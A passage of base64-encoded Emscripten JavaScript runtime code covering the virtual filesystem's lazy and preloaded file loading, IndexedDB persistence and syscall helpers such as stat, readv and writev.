pb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvcyl7dmFyIGJ5dGVzUmVhZD0wO2Zvcih2YXIgaT0wO2k8bGVuZ3RoO2krKyl7dmFyIHJlc3VsdDt0cnl7cmVzdWx0PWlucHV0KCl9Y2F0Y2goZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlPKX1pZihyZXN1bHQ9PT11bmRlZmluZWQmJmJ5dGVzUmVhZD09PTApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVBR0FJTil9aWYocmVzdWx0PT09bnVsbHx8cmVzdWx0PT09dW5kZWZpbmVkKWJyZWFrO2J5dGVzUmVhZCsrO2J1ZmZlcltvZmZzZXQraV09cmVzdWx0fWlmKGJ5dGVzUmVhZCl7c3RyZWFtLm5vZGUudGltZXN0YW1wPURhdGUubm93KCl9cmV0dXJuIGJ5dGVzUmVhZH0pLHdyaXRlOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zKXtmb3IodmFyIGk9MDtpPGxlbmd0aDtpKyspe3RyeXtvdXRwdXQoYnVmZmVyW29mZnNldCtpXSl9Y2F0Y2goZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlPKX19aWYobGVuZ3RoKXtzdHJlYW0ubm9kZS50aW1lc3RhbXA9RGF0ZS5ub3coKX1yZXR1cm4gaX0pfSk7cmV0dXJuIEZTLm1rZGV2KHBhdGgsbW9kZSxkZXYpfSksY3JlYXRlTGluazooZnVuY3Rpb24ocGFyZW50LG5hbWUsdGFyZ2V0LGNhblJlYWQsY2FuV3JpdGUpe3ZhciBwYXRoPVBBVEguam9pbjIodHlwZW9mIHBhcmVudD09PSJzdHJpbmciP3BhcmVudDpGUy5nZXRQYXRoKHBhcmVudCksbmFtZSk7cmV0dXJuIEZTLnN5bWxpbmsodGFyZ2V0LHBhdGgpfSksZm9yY2VMb2FkRmlsZTooZnVuY3Rpb24ob2JqKXtpZihvYmouaXNEZXZpY2V8fG9iai5pc0ZvbGRlcnx8b2JqLmxpbmt8fG9iai5jb250ZW50cylyZXR1cm4hMDt2YXIgc3VjY2Vzcz0hMDtpZih0eXBlb2YgWE1MSHR0cFJlcXVlc3QhPT0idW5kZWZpbmVkIil7dGhyb3cgbmV3IEVycm9yKCJMYXp5IGxvYWRpbmcgc2hvdWxkIGhhdmUgYmVlbiBwZXJmb3JtZWQgKGNvbnRlbnRzIHNldCkgaW4gY3JlYXRlTGF6eUZpbGUsIGJ1dCBpdCB3YXMgbm90LiBMYXp5IGxvYWRpbmcgb25seSB3b3JrcyBpbiB3ZWIgd29ya2Vycy4gVXNlIC0tZW1iZWQtZmlsZSBvciAtLXByZWxvYWQtZmlsZSBpbiBlbWNjIG9uIHRoZSBtYWluIHRocmVhZC4iKX1lbHNlIGlmKE1vZHVsZS5yZWFkKXt0cnl7b2JqLmNvbnRlbnRzPWludEFycmF5RnJvbVN0cmluZyhNb2R1bGUucmVhZChvYmoudXJsKSwhMCk7b2JqLnVzZWRCeXRlcz1vYmouY29udGVudHMubGVuZ3RofWNhdGNoKGUpe3N1Y2Nlc3M9ITF9fWVsc2V7dGhyb3cgbmV3IEVycm9yKCJDYW5ub3QgbG9hZCB3aXRob3V0IHJlYWQoKSBvciBYTUxIdHRwUmVxdWVzdC4iKX1pZighc3VjY2VzcylfX19zZXRFcnJObyhFUlJOT19DT0RFUy5FSU8pO3JldHVybiBzdWNjZXNzfSksY3JlYXRlTGF6eUZpbGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLHVybCxjYW5SZWFkLGNhbldyaXRlKXtmdW5jdGlvbiBMYXp5VWludDhBcnJheSgpe3RoaXMubGVuZ3RoS25vd249ITE7dGhpcy5jaHVua3M9W119TGF6eVVpbnQ4QXJyYXkucHJvdG90eXBlLmdldD1mdW5jdGlvbiBMYXp5VWludDhBcnJheV9nZXQoaWR4KXtpZihpZHg+dGhpcy5sZW5ndGgtMXx8aWR4PDApe3JldHVybiB1bmRlZmluZWR9dmFyIGNodW5rT2Zmc2V0PWlkeCV0aGlzLmNodW5rU2l6ZTt2YXIgY2h1bmtOdW09aWR4L3RoaXMuY2h1bmtTaXplfDA7cmV0dXJuIHRoaXMuZ2V0dGVyKGNodW5rTnVtKVtjaHVua09mZnNldF19O0xhenlVaW50OEFycmF5LnByb3RvdHlwZS5zZXREYXRhR2V0dGVyPWZ1bmN0aW9uIExhenlVaW50OEFycmF5X3NldERhdGFHZXR0ZXIoZ2V0dGVyKXt0aGlzLmdldHRlcj1nZXR0ZXJ9O0xhenlVaW50OEFycmF5LnByb3RvdHlwZS5jYWNoZUxlbmd0aD1mdW5jdGlvbiBMYXp5VWludDhBcnJheV9jYWNoZUxlbmd0aCgpe3ZhciB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0O3hoci5vcGVuKCJIRUFEIix1cmwsITEpO3hoci5zZW5kKG51bGwpO2lmKCEoeGhyLnN0YXR1cz49MjAwJiZ4aHIuc3RhdHVzPDMwMHx8eGhyLnN0YXR1cz09PTMwNCkpdGhyb3cgbmV3IEVycm9yKCJDb3VsZG5cJ3QgbG9hZCAiK3VybCsiLiBTdGF0dXM6ICIreGhyLnN0YXR1cyk7dmFyIGRhdGFsZW5ndGg9TnVtYmVyKHhoci5nZXRSZXNwb25zZUhlYWRlcigiQ29udGVudC1sZW5ndGgiKSk7dmFyIGhlYWRlcjt2YXIgaGFzQnl0ZVNlcnZpbmc9KGhlYWRlcj14aHIuZ2V0UmVzcG9uc2VIZWFkZXIoIkFjY2VwdC1SYW5nZXMiKSkmJmhlYWRlcj09PSJieXRlcyI7dmFyIHVzZXNHemlwPShoZWFkZXI9eGhyLmdldFJlc3BvbnNlSGVhZGVyKCJDb250ZW50LUVuY29kaW5nIikpJiZoZWFkZXI9PT0iZ3ppcCI7dmFyIGNodW5rU2l6ZT0xMDI0KjEwMjQ7aWYoIWhhc0J5dGVTZXJ2aW5nKWNodW5rU2l6ZT1kYXRhbGVuZ3RoO3ZhciBkb1hIUj0oZnVuY3Rpb24oZnJvbSx0byl7aWYoZnJvbT50byl0aHJvdyBuZXcgRXJyb3IoImludmFsaWQgcmFuZ2UgKCIrZnJvbSsiLCAiK3RvKyIpIG9yIG5vIGJ5dGVzIHJlcXVlc3RlZCEiKTtpZih0bz5kYXRhbGVuZ3RoLTEpdGhyb3cgbmV3IEVycm9yKCJvbmx5ICIrZGF0YWxlbmd0aCsiIGJ5dGVzIGF2YWlsYWJsZSEgcHJvZ3JhbW1lciBlcnJvciEiKTt2YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHIub3BlbigiR0VUIix1cmwsITEpO2lmKGRhdGFsZW5ndGghPT1jaHVua1NpemUpeGhyLnNldFJlcXVlc3RIZWFkZXIoIlJhbmdlIiwiYnl0ZXM9Iitmcm9tKyItIit0byk7aWYodHlwZW9mIFVpbnQ4QXJyYXkhPSJ1bmRlZmluZWQiKXhoci5yZXNwb25zZVR5cGU9ImFycmF5YnVmZmVyIjtpZih4aHIub3ZlcnJpZGVNaW1lVHlwZSl7eGhyLm92ZXJyaWRlTWltZVR5cGUoInRleHQvcGxhaW47IGNoYXJzZXQ9eC11c2VyLWRlZmluZWQiKX14aHIuc2VuZChudWxsKTtpZighKHhoci5zdGF0dXM+PTIwMCYmeGhyLnN0YXR1czwzMDB8fHhoci5zdGF0dXM9PT0zMDQpKXRocm93IG5ldyBFcnJvcigiQ291bGRuXCd0IGxvYWQgIit1cmwrIi4gU3RhdHVzOiAiK3hoci5zdGF0dXMpO2lmKHhoci5yZXNwb25zZSE9PXVuZGVmaW5lZCl7cmV0dXJuIG5ldyBVaW50OEFycmF5KHhoci5yZXNwb25zZXx8W10pfWVsc2V7cmV0dXJuIGludEFycmF5RnJvbVN0cmluZyh4aHIucmVzcG9uc2VUZXh0fHwiIiwhMCl9fSk7dmFyIGxhenlBcnJheT10aGlzO2xhenlBcnJheS5zZXREYXRhR2V0dGVyKChmdW5jdGlvbihjaHVua051bSl7dmFyIHN0YXJ0PWNodW5rTnVtKmNodW5rU2l6ZTt2YXIgZW5kPShjaHVua051bSsxKSpjaHVua1NpemUtMTtlbmQ9TWF0aC5taW4oZW5kLGRhdGFsZW5ndGgtMSk7aWYodHlwZW9mIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dPT09InVuZGVmaW5lZCIpe2xhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dPWRvWEhSKHN0YXJ0LGVuZCl9aWYodHlwZW9mIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dPT09InVuZGVmaW5lZCIpdGhyb3cgbmV3IEVycm9yKCJkb1hIUiBmYWlsZWQhIik7cmV0dXJuIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dfSkpO2lmKHVzZXNHemlwfHwhZGF0YWxlbmd0aCl7Y2h1bmtTaXplPWRhdGFsZW5ndGg9MTtkYXRhbGVuZ3RoPXRoaXMuZ2V0dGVyKDApLmxlbmd0aDtjaHVua1NpemU9ZGF0YWxlbmd0aDtjb25zb2xlLmxvZygiTGF6eUZpbGVzIG9uIGd6aXAgZm9yY2VzIGRvd25sb2FkIG9mIHRoZSB3aG9sZSBmaWxlIHdoZW4gbGVuZ3RoIGlzIGFjY2Vzc2VkIil9dGhpcy5fbGVuZ3RoPWRhdGFsZW5ndGg7dGhpcy5fY2h1bmtTaXplPWNodW5rU2l6ZTt0aGlzLmxlbmd0aEtub3duPSEwfTtpZih0eXBlb2YgWE1MSHR0cFJlcXVlc3QhPT0idW5kZWZpbmVkIil7aWYoIUVOVklST05NRU5UX0lTX1dPUktFUil0aHJvdyJDYW5ub3QgZG8gc3luY2hyb25vdXMgYmluYXJ5IFhIUnMgb3V0c2lkZSB3ZWJ3b3JrZXJzIGluIG1vZGVybiBicm93c2Vycy4gVXNlIC0tZW1iZWQtZmlsZSBvciAtLXByZWxvYWQtZmlsZSBpbiBlbWNjIjt2YXIgbGF6eUFycmF5PW5ldyBMYXp5VWludDhBcnJheTtPYmplY3QuZGVmaW5lUHJvcGVydGllcyhsYXp5QXJyYXkse2xlbmd0aDp7Z2V0OihmdW5jdGlvbigpe2lmKCF0aGlzLmxlbmd0aEtub3duKXt0aGlzLmNhY2hlTGVuZ3RoKCl9cmV0dXJuIHRoaXMuX2xlbmd0aH0pfSxjaHVua1NpemU6e2dldDooZnVuY3Rpb24oKXtpZighdGhpcy5sZW5ndGhLbm93bil7dGhpcy5jYWNoZUxlbmd0aCgpfXJldHVybiB0aGlzLl9jaHVua1NpemV9KX19KTt2YXIgcHJvcGVydGllcz17aXNEZXZpY2U6ITEsY29udGVudHM6bGF6eUFycmF5fX1lbHNle3ZhciBwcm9wZXJ0aWVzPXtpc0RldmljZTohMSx1cmw6dXJsfX12YXIgbm9kZT1GUy5jcmVhdGVGaWxlKHBhcmVudCxuYW1lLHByb3BlcnRpZXMsY2FuUmVhZCxjYW5Xcml0ZSk7aWYocHJvcGVydGllcy5jb250ZW50cyl7bm9kZS5jb250ZW50cz1wcm9wZXJ0aWVzLmNvbnRlbnRzfWVsc2UgaWYocHJvcGVydGllcy51cmwpe25vZGUuY29udGVudHM9bnVsbDtub2RlLnVybD1wcm9wZXJ0aWVzLnVybH1PYmplY3QuZGVmaW5lUHJvcGVydGllcyhub2RlLHt1c2VkQnl0ZXM6e2dldDooZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5jb250ZW50cy5sZW5ndGh9KX19KTt2YXIgc3RyZWFtX29wcz17fTt2YXIga2V5cz1PYmplY3Qua2V5cyhub2RlLnN0cmVhbV9vcHMpO2tleXMuZm9yRWFjaCgoZnVuY3Rpb24oa2V5KXt2YXIgZm49bm9kZS5zdHJlYW1fb3BzW2tleV07c3RyZWFtX29wc1trZXldPWZ1bmN0aW9uIGZvcmNlTG9hZExhenlGaWxlKCl7aWYoIUZTLmZvcmNlTG9hZEZpbGUobm9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTyl9cmV0dXJuIGZuLmFwcGx5KG51bGwsYXJndW1lbnRzKX19KSk7c3RyZWFtX29wcy5yZWFkPWZ1bmN0aW9uIHN0cmVhbV9vcHNfcmVhZChzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24pe2lmKCFGUy5mb3JjZUxvYWRGaWxlKG5vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pfXZhciBjb250ZW50cz1zdHJlYW0ubm9kZS5jb250ZW50cztpZihwb3NpdGlvbj49Y29udGVudHMubGVuZ3RoKXJldHVybiAwO3ZhciBzaXplPU1hdGgubWluKGNvbnRlbnRzLmxlbmd0aC1wb3NpdGlvbixsZW5ndGgpO2Fzc2VydChzaXplPj0wKTtpZihjb250ZW50cy5zbGljZSl7Zm9yKHZhciBpPTA7aTxzaXplO2krKyl7YnVmZmVyW29mZnNldCtpXT1jb250ZW50c1twb3NpdGlvbitpXX19ZWxzZXtmb3IodmFyIGk9MDtpPHNpemU7aSsrKXtidWZmZXJbb2Zmc2V0K2ldPWNvbnRlbnRzLmdldChwb3NpdGlvbitpKX19cmV0dXJuIHNpemV9O25vZGUuc3RyZWFtX29wcz1zdHJlYW1fb3BzO3JldHVybiBub2RlfSksY3JlYXRlUHJlbG9hZGVkRmlsZTooZnVuY3Rpb24ocGFyZW50LG5hbWUsdXJsLGNhblJlYWQsY2FuV3JpdGUsb25sb2FkLG9uZXJyb3IsZG9udENyZWF0ZUZpbGUsY2FuT3duLHByZUZpbmlzaCl7QnJvd3Nlci5pbml0KCk7dmFyIGZ1bGxuYW1lPW5hbWU/UEFUSC5yZXNvbHZlKFBBVEguam9pbjIocGFyZW50LG5hbWUpKTpwYXJlbnQ7dmFyIGRlcD1nZXRVbmlxdWVSdW5EZXBlbmRlbmN5KCJjcCAiK2Z1bGxuYW1lKTtmdW5jdGlvbiBwcm9jZXNzRGF0YShieXRlQXJyYXkpe2Z1bmN0aW9uIGZpbmlzaChieXRlQXJyYXkpe2lmKHByZUZpbmlzaClwcmVGaW5pc2goKTtpZighZG9udENyZWF0ZUZpbGUpe0ZTLmNyZWF0ZURhdGFGaWxlKHBhcmVudCxuYW1lLGJ5dGVBcnJheSxjYW5SZWFkLGNhbldyaXRlLGNhbk93bil9aWYob25sb2FkKW9ubG9hZCgpO3JlbW92ZVJ1bkRlcGVuZGVuY3koZGVwKX12YXIgaGFuZGxlZD0hMTtNb2R1bGUucHJlbG9hZFBsdWdpbnMuZm9yRWFjaCgoZnVuY3Rpb24ocGx1Z2luKXtpZihoYW5kbGVkKXJldHVybjtpZihwbHVnaW5bImNhbkhhbmRsZSJdKGZ1bGxuYW1lKSl7cGx1Z2luWyJoYW5kbGUiXShieXRlQXJyYXksZnVsbG5hbWUsZmluaXNoLChmdW5jdGlvbigpe2lmKG9uZXJyb3Ipb25lcnJvcigpO3JlbW92ZVJ1bkRlcGVuZGVuY3koZGVwKX0pKTtoYW5kbGVkPSEwfX0pKTtpZighaGFuZGxlZClmaW5pc2goYnl0ZUFycmF5KX1hZGRSdW5EZXBlbmRlbmN5KGRlcCk7aWYodHlwZW9mIHVybD09InN0cmluZyIpe0Jyb3dzZXIuYXN5bmNMb2FkKHVybCwoZnVuY3Rpb24oYnl0ZUFycmF5KXtwcm9jZXNzRGF0YShieXRlQXJyYXkpfSksb25lcnJvcil9ZWxzZXtwcm9jZXNzRGF0YSh1cmwpfX0pLGluZGV4ZWREQjooZnVuY3Rpb24oKXtyZXR1cm4gd2luZG93LmluZGV4ZWREQnx8d2luZG93Lm1vekluZGV4ZWREQnx8d2luZG93LndlYmtpdEluZGV4ZWREQnx8d2luZG93Lm1zSW5kZXhlZERCfSksREJfTkFNRTooZnVuY3Rpb24oKXtyZXR1cm4iRU1fRlNfIit3aW5kb3cubG9jYXRpb24ucGF0aG5hbWV9KSxEQl9WRVJTSU9OOjIwLERCX1NUT1JFX05BTUU6IkZJTEVfREFUQSIsc2F2ZUZpbGVzVG9EQjooZnVuY3Rpb24ocGF0aHMsb25sb2FkLG9uZXJyb3Ipe29ubG9hZD1vbmxvYWR8fChmdW5jdGlvbigpe30pO29uZXJyb3I9b25lcnJvcnx8KGZ1bmN0aW9uKCl7fSk7dmFyIGluZGV4ZWREQj1GUy5pbmRleGVkREIoKTt0cnl7dmFyIG9wZW5SZXF1ZXN0PWluZGV4ZWREQi5vcGVuKEZTLkRCX05BTUUoKSxGUy5EQl9WRVJTSU9OKX1jYXRjaChlKXtyZXR1cm4gb25lcnJvcihlKX1vcGVuUmVxdWVzdC5vbnVwZ3JhZGVuZWVkZWQ9ZnVuY3Rpb24gb3BlblJlcXVlc3Rfb251cGdyYWRlbmVlZGVkKCl7Y29uc29sZS5sb2coImNyZWF0aW5nIGRiIik7dmFyIGRiPW9wZW5SZXF1ZXN0LnJlc3VsdDtkYi5jcmVhdGVPYmplY3RTdG9yZShGUy5EQl9TVE9SRV9OQU1FKX07b3BlblJlcXVlc3Qub25zdWNjZXNzPWZ1bmN0aW9uIG9wZW5SZXF1ZXN0X29uc3VjY2Vzcygpe3ZhciBkYj1vcGVuUmVxdWVzdC5yZXN1bHQ7dmFyIHRyYW5zYWN0aW9uPWRiLnRyYW5zYWN0aW9uKFtGUy5EQl9TVE9SRV9OQU1FXSwicmVhZHdyaXRlIik7dmFyIGZpbGVzPXRyYW5zYWN0aW9uLm9iamVjdFN0b3JlKEZTLkRCX1NUT1JFX05BTUUpO3ZhciBvaz0wLGZhaWw9MCx0b3RhbD1wYXRocy5sZW5ndGg7ZnVuY3Rpb24gZmluaXNoKCl7aWYoZmFpbD09MClvbmxvYWQoKTtlbHNlIG9uZXJyb3IoKX1wYXRocy5mb3JFYWNoKChmdW5jdGlvbihwYXRoKXt2YXIgcHV0UmVxdWVzdD1maWxlcy5wdXQoRlMuYW5hbHl6ZVBhdGgocGF0aCkub2JqZWN0LmNvbnRlbnRzLHBhdGgpO3B1dFJlcXVlc3Qub25zdWNjZXNzPWZ1bmN0aW9uIHB1dFJlcXVlc3Rfb25zdWNjZXNzKCl7b2srKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX07cHV0UmVxdWVzdC5vbmVycm9yPWZ1bmN0aW9uIHB1dFJlcXVlc3Rfb25lcnJvcigpe2ZhaWwrKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX19KSk7dHJhbnNhY3Rpb24ub25lcnJvcj1vbmVycm9yfTtvcGVuUmVxdWVzdC5vbmVycm9yPW9uZXJyb3J9KSxsb2FkRmlsZXNGcm9tREI6KGZ1bmN0aW9uKHBhdGhzLG9ubG9hZCxvbmVycm9yKXtvbmxvYWQ9b25sb2FkfHwoZnVuY3Rpb24oKXt9KTtvbmVycm9yPW9uZXJyb3J8fChmdW5jdGlvbigpe30pO3ZhciBpbmRleGVkREI9RlMuaW5kZXhlZERCKCk7dHJ5e3ZhciBvcGVuUmVxdWVzdD1pbmRleGVkREIub3BlbihGUy5EQl9OQU1FKCksRlMuREJfVkVSU0lPTil9Y2F0Y2goZSl7cmV0dXJuIG9uZXJyb3IoZSl9b3BlblJlcXVlc3Qub251cGdyYWRlbmVlZGVkPW9uZXJyb3I7b3BlblJlcXVlc3Qub25zdWNjZXNzPWZ1bmN0aW9uIG9wZW5SZXF1ZXN0X29uc3VjY2Vzcygpe3ZhciBkYj1vcGVuUmVxdWVzdC5yZXN1bHQ7dHJ5e3ZhciB0cmFuc2FjdGlvbj1kYi50cmFuc2FjdGlvbihbRlMuREJfU1RPUkVfTkFNRV0sInJlYWRvbmx5Iil9Y2F0Y2goZSl7b25lcnJvcihlKTtyZXR1cm59dmFyIGZpbGVzPXRyYW5zYWN0aW9uLm9iamVjdFN0b3JlKEZTLkRCX1NUT1JFX05BTUUpO3ZhciBvaz0wLGZhaWw9MCx0b3RhbD1wYXRocy5sZW5ndGg7ZnVuY3Rpb24gZmluaXNoKCl7aWYoZmFpbD09MClvbmxvYWQoKTtlbHNlIG9uZXJyb3IoKX1wYXRocy5mb3JFYWNoKChmdW5jdGlvbihwYXRoKXt2YXIgZ2V0UmVxdWVzdD1maWxlcy5nZXQocGF0aCk7Z2V0UmVxdWVzdC5vbnN1Y2Nlc3M9ZnVuY3Rpb24gZ2V0UmVxdWVzdF9vbnN1Y2Nlc3MoKXtpZihGUy5hbmFseXplUGF0aChwYXRoKS5leGlzdHMpe0ZTLnVubGluayhwYXRoKX1GUy5jcmVhdGVEYXRhRmlsZShQQVRILmRpcm5hbWUocGF0aCksUEFUSC5iYXNlbmFtZShwYXRoKSxnZXRSZXF1ZXN0LnJlc3VsdCwhMCwhMCwhMCk7b2srKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX07Z2V0UmVxdWVzdC5vbmVycm9yPWZ1bmN0aW9uIGdldFJlcXVlc3Rfb25lcnJvcigpe2ZhaWwrKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX19KSk7dHJhbnNhY3Rpb24ub25lcnJvcj1vbmVycm9yfTtvcGVuUmVxdWVzdC5vbmVycm9yPW9uZXJyb3J9KX07dmFyIFNZU0NBTExTPXtERUZBVUxUX1BPTExNQVNLOjUsbWFwcGluZ3M6e30sdW1hc2s6NTExLGNhbGN1bGF0ZUF0OihmdW5jdGlvbihkaXJmZCxwYXRoKXtpZihwYXRoWzBdIT09Ii8iKXt2YXIgZGlyO2lmKGRpcmZkPT09LTEwMCl7ZGlyPUZTLmN3ZCgpfWVsc2V7dmFyIGRpcnN0cmVhbT1GUy5nZXRTdHJlYW0oZGlyZmQpO2lmKCFkaXJzdHJlYW0pdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpO2Rpcj1kaXJzdHJlYW0ucGF0aH1wYXRoPVBBVEguam9pbjIoZGlyLHBhdGgpfXJldHVybiBwYXRofSksZG9TdGF0OihmdW5jdGlvbihmdW5jLHBhdGgsYnVmKXt0cnl7dmFyIHN0YXQ9ZnVuYyhwYXRoKX1jYXRjaChlKXtpZihlJiZlLm5vZGUmJlBBVEgubm9ybWFsaXplKHBhdGgpIT09UEFUSC5ub3JtYWxpemUoRlMuZ2V0UGF0aChlLm5vZGUpKSl7cmV0dXJuLUVSUk5PX0NPREVTLkVOT1RESVJ9dGhyb3cgZX1IRUFQMzJbYnVmPj4yXT1zdGF0LmRldjtIRUFQMzJbYnVmKzQ+PjJdPTA7SEVBUDMyW2J1Zis4Pj4yXT1zdGF0LmlubztIRUFQMzJbYnVmKzEyPj4yXT1zdGF0Lm1vZGU7SEVBUDMyW2J1ZisxNj4+Ml09c3RhdC5ubGluaztIRUFQMzJbYnVmKzIwPj4yXT1zdGF0LnVpZDtIRUFQMzJbYnVmKzI0Pj4yXT1zdGF0LmdpZDtIRUFQMzJbYnVmKzI4Pj4yXT1zdGF0LnJkZXY7SEVBUDMyW2J1ZiszMj4+Ml09MDtIRUFQMzJbYnVmKzM2Pj4yXT1zdGF0LnNpemU7SEVBUDMyW2J1Zis0MD4+Ml09NDA5NjtIRUFQMzJbYnVmKzQ0Pj4yXT1zdGF0LmJsb2NrcztIRUFQMzJbYnVmKzQ4Pj4yXT1zdGF0LmF0aW1lLmdldFRpbWUoKS8xZTN8MDtIRUFQMzJbYnVmKzUyPj4yXT0wO0hFQVAzMltidWYrNTY+PjJdPXN0YXQubXRpbWUuZ2V0VGltZSgpLzFlM3wwO0hFQVAzMltidWYrNjA+PjJdPTA7SEVBUDMyW2J1Zis2ND4+Ml09c3RhdC5jdGltZS5nZXRUaW1lKCkvMWUzfDA7SEVBUDMyW2J1Zis2OD4+Ml09MDtIRUFQMzJbYnVmKzcyPj4yXT1zdGF0LmlubztyZXR1cm4gMH0pLGRvTXN5bmM6KGZ1bmN0aW9uKGFkZHIsc3RyZWFtLGxlbixmbGFncyl7dmFyIGJ1ZmZlcj1uZXcgVWludDhBcnJheShIRUFQVTguc3ViYXJyYXkoYWRkcixhZGRyK2xlbikpO0ZTLm1zeW5jKHN0cmVhbSxidWZmZXIsMCxsZW4sZmxhZ3MpfSksZG9Na2RpcjooZnVuY3Rpb24ocGF0aCxtb2RlKXtwYXRoPVBBVEgubm9ybWFsaXplKHBhdGgpO2lmKHBhdGhbcGF0aC5sZW5ndGgtMV09PT0iLyIpcGF0aD1wYXRoLnN1YnN0cigwLHBhdGgubGVuZ3RoLTEpO0ZTLm1rZGlyKHBhdGgsbW9kZSwwKTtyZXR1cm4gMH0pLGRvTWtub2Q6KGZ1bmN0aW9uKHBhdGgsbW9kZSxkZXYpe3N3aXRjaChtb2RlJjYxNDQwKXtjYXNlIDMyNzY4OmNhc2UgODE5MjpjYXNlIDI0NTc2OmNhc2UgNDA5NjpjYXNlIDQ5MTUyOmJyZWFrO2RlZmF1bHQ6cmV0dXJuLUVSUk5PX0NPREVTLkVJTlZBTH1GUy5ta25vZChwYXRoLG1vZGUsZGV2KTtyZXR1cm4gMH0pLGRvUmVhZGxpbms6KGZ1bmN0aW9uKHBhdGgsYnVmLGJ1ZnNpemUpe2lmKGJ1ZnNpemU8PTApcmV0dXJuLUVSUk5PX0NPREVTLkVJTlZBTDt2YXIgcmV0PUZTLnJlYWRsaW5rKHBhdGgpO3ZhciBsZW49TWF0aC5taW4oYnVmc2l6ZSxsZW5ndGhCeXRlc1VURjgocmV0KSk7dmFyIGVuZENoYXI9SEVBUDhbYnVmK2xlbl07c3RyaW5nVG9VVEY4KHJldCxidWYsYnVmc2l6ZSsxKTtIRUFQOFtidWYrbGVuXT1lbmRDaGFyO3JldHVybiBsZW59KSxkb0FjY2VzczooZnVuY3Rpb24ocGF0aCxhbW9kZSl7aWYoYW1vZGUmfjcpe3JldHVybi1FUlJOT19DT0RFUy5FSU5WQUx9dmFyIG5vZGU7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse2ZvbGxvdzohMH0pO25vZGU9bG9va3VwLm5vZGU7dmFyIHBlcm1zPSIiO2lmKGFtb2RlJjQpcGVybXMrPSJyIjtpZihhbW9kZSYyKXBlcm1zKz0idyI7aWYoYW1vZGUmMSlwZXJtcys9IngiO2lmKHBlcm1zJiZGUy5ub2RlUGVybWlzc2lvbnMobm9kZSxwZXJtcykpe3JldHVybi1FUlJOT19DT0RFUy5FQUNDRVN9cmV0dXJuIDB9KSxkb0R1cDooZnVuY3Rpb24ocGF0aCxmbGFncyxzdWdnZXN0RkQpe3ZhciBzdWdnZXN0PUZTLmdldFN0cmVhbShzdWdnZXN0RkQpO2lmKHN1Z2dlc3QpRlMuY2xvc2Uoc3VnZ2VzdCk7cmV0dXJuIEZTLm9wZW4ocGF0aCxmbGFncywwLHN1Z2dlc3RGRCxzdWdnZXN0RkQpLmZkfSksZG9SZWFkdjooZnVuY3Rpb24oc3RyZWFtLGlvdixpb3ZjbnQsb2Zmc2V0KXt2YXIgcmV0PTA7Zm9yKHZhciBpPTA7aTxpb3ZjbnQ7aSsrKXt2YXIgcHRyPUhFQVAzMltpb3YraSo4Pj4yXTt2YXIgbGVuPUhFQVAzMltpb3YrKGkqOCs0KT4+Ml07dmFyIGN1cnI9RlMucmVhZChzdHJlYW0sSEVBUDgscHRyLGxlbixvZmZzZXQpO2lmKGN1cnI8MClyZXR1cm4tMTtyZXQrPWN1cnI7aWYoY3VycjxsZW4pYnJlYWt9cmV0dXJuIHJldH0pLGRvV3JpdGV2OihmdW5jdGlvbihzdHJlYW0saW92LGlvdmNudCxvZmZzZXQpe3ZhciByZXQ9MDtmb3IodmFyIGk9MDtpPGlvdmNudDtpKyspe3ZhciBwdHI9SEVBUDMyW2lvditpKjg+PjJdO3ZhciBsZW49SEVBUDMyW2lvdisoaSo4KzQpPj4yXTt2YXIgY3Vycj1GUy53cml0ZShzdHJlYW0sSEVBUDgscHRyLGxlbixvZmZzZXQpO2lmKGN1cnI8MClyZXR1cm4tMTtyZXQrPWN1cnJ9cmV0dXJuIHJldH0pLHZhcmFyZ3M6MCxnZXQ6KGZ1bmN0aW9uKHZhcmFyZ3Mpe1NZU0NBTExTLnZhcmFyZ3MrPTQ7dmFyIHJldD1IRUFQMzJbU1lTQ0FMTFMudmFyYXJncy00Pj4yXTtyZXR1cm4gcmV0fSksZ2V0U3RyOihmdW5jdGlvbigpe3ZhciByZXQ9UG9pbnRlcl9zdHJpbmdpZnkoU1lTQ0FMTFMuZ2V0KCkpO3JldHVybiByZXR9KSxnZXRTdHJlYW1Gcm9tRkQ6KGZ1bmN0aW9uKCl7dmFyIHN0cmVhbT1GUy5nZXRTdHJlYW0oU1lTQ0FMTFMuZ2V0KCkpO2lmKCFzdHJlYW0pdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpO3JldHVybiBzdHJlYW19KSxnZXRTb2NrZXRGcm9tRkQ6KGZ1bmN0aW9uKCl7dmFyIHNvY2tldD1TT0NLRlMuZ2V0U29ja2V0KFNZU0NBTExTLmdldCgpKTtpZighc29ja2V0KXRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKTtyZXR1cm4gc29ja2V0fSksZ2V0U29ja2V0QWRkcmVzczooZnVuY3Rpb24oYWxsb3dOdWxsKXt2YXIgYWRkcnA9U1lTQ0FMTFMuZ2V0KCksYWRkcmxlbj1TWVNDQUxMUy5nZXQoKTtpZihhbGxvd051bGwmJmFkZHJwPT09MClyZXR1cm4gbnVsbDt2YXIgaW5mbz1fX3JlYWRfc29ja2FkZHIoYWRkcnAsYWRkcmxl